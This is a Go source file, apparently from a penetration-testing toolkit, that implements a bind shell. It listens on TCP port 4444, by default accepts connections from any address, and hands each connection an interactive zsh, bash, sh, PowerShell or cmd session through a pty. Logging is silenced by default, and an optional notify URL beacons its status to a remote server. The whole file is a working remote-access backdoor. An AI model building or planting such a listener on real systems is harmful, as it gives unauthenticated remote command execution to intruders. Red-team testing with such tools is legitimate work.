package main

import (
	"bytes"
	"encoding/json"
	"github.com/creack/pty"
	"github.com/defektive/xodbox/pkg/util"
	"github.com/defektive/xodbox/pkg/xlog"
	"io"
	"log/slog"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"syscall"
	"time"
	//"time"
)

var notifyURL = ""

// listener can be overridden at build time. defaults to :4444
var listener = ":4444"

// allowedCIDR can be overridden at build time. defaults to 0.0.0.0/0
var allowedCIDR = "0.0.0.0/0"

var logLevel = "NONE"
var pkgLogger *slog.Logger

var loglevels map[string]slog.Level = map[string]slog.Level{
	"NONE":                   10,
	slog.LevelInfo.String():  slog.LevelInfo,
	slog.LevelWarn.String():  slog.LevelWarn,
	slog.LevelError.String(): slog.LevelError,
	slog.LevelDebug.String(): slog.LevelDebug,
}

// lg internal log helper
func lg() *slog.Logger {
	if pkgLogger == nil {
		pkgLogger = xlog.Get()
	}
	return pkgLogger
}

func main() {

	if ll, ok := loglevels[logLevel]; ok {
		xlog.LogLevel(ll)
	}

	_, allowedNet, err := net.ParseCIDR(allowedCIDR)
	if err != nil {
		lg().Error("Error parsing allowed CIDR", "allowedCIDR", allowedCIDR, "err", err)
	}

	serverListener, err := net.Listen("tcp", listener) //starts a listener on tcp port 4444

	if err != nil {
		lg().Error("Error starting listener", "listener", listener, "err", err)
		notify("Error starting listener", "listener", listener, "err", err.Error())

	} else {
		lg().Info("Listening on", "listener", listener)
		notify("Listening on", "listener", listener)
	}

	//By removing this loop, you could have the program mimic netcat and end after one connection completes
	for {
		connection, err := serverListener.Accept() //waits for and returns the next connection to the listener
		if err != nil {
			lg().Error("Error accepting connection", "err", err)
		}

		lg().Debug("Accepted connection from", "remoteAddr", connection.RemoteAddr().String())
		host, _ := util.HostAndPortFromRemoteAddr(connection.RemoteAddr().String())

		remoteIP := net.ParseIP(host)

		lg().Debug("parsed ip", "remoteIP", remoteIP, "allowedNet", allowedNet)
		if allowedNet.Contains(remoteIP) {
			go handleConnection(connection) //go handle the connection concurrently in a goroutine
		} else {
			lg().Error("closing connection from unauthorized IP", "remoteIP", remoteIP, "allowedNet", allowedNet)
			connection.Close()
		}
	}
}

// notify sends notification to remote server if specified
func notify(msg ...string) {
	if notifyURL != "" {
		b, _ := json.MarshalIndent(msg, "", "  ")
		http.Post(notifyURL, "application/json", bytes.NewBuffer(b))
	}
}

// receives a reference to a connection, spawns a bash shell over the tcp connection
func handleConnection(connection net.Conn) {
	lg().Info("Accepted connection from", "remoteAddr", connection.RemoteAddr().String())

	shell := getCommandToExecute()

	_, err := connection.Write([]byte("connection successful, " + shell + " session over tcp initiated\n")) //convert the string to a byte slice and send it over the connection
	if err != nil {
		lg().Error("Error writing response", "err", err)
	}

	c := exec.Command(shell)
	if runtime.GOOS == "linux" {
		// try to get a sweet tty

		// Start the command with a pty.
		ptmx, err := pty.Start(c)
		if err != nil {
			lg().Error("Error starting pty", "err", err)
			connection.Write([]byte("Error starting pty " + err.Error() + "\n")) //convert the string to a byte slice and send it over the connection

			return
		}
		// Make sure to close the pty at the end.
		defer func() { _ = ptmx.Close() }() // Best effort.

		// Handle pty size.
		ch := make(chan os.Signal, 1)
		signal.Notify(ch, syscall.SIGWINCH)
		ch <- syscall.SIGWINCH                        // Initial resize.
		defer func() { signal.Stop(ch); close(ch) }() // Cleanup signals when done.

		// Copy connection to the pty and the pty to connection.
		// NOTE: The goroutine will keep reading until the next keystroke before returning.
		go func() { _, _ = io.Copy(ptmx, connection) }()
		_, _ = io.Copy(connection, ptmx)
		for {
			// just run forever
			time.Sleep(time.Second * 1)
		}

	} else {
		c.Stdin = connection //connection pointer is dereferenced to retrieve the connection data
		c.Stdout = connection
		c.Stderr = connection
		c.Run()
	}

}

func getCommandToExecute() string {

	cmds := []string{"zsh", "bash", "sh", "busybox", "powershell", "cmd"}
	for _, cmd := range cmds {
		res, err := exec.LookPath(cmd)
		if err == nil {
			return res
		}
	}
	return "/bin/sh"
}
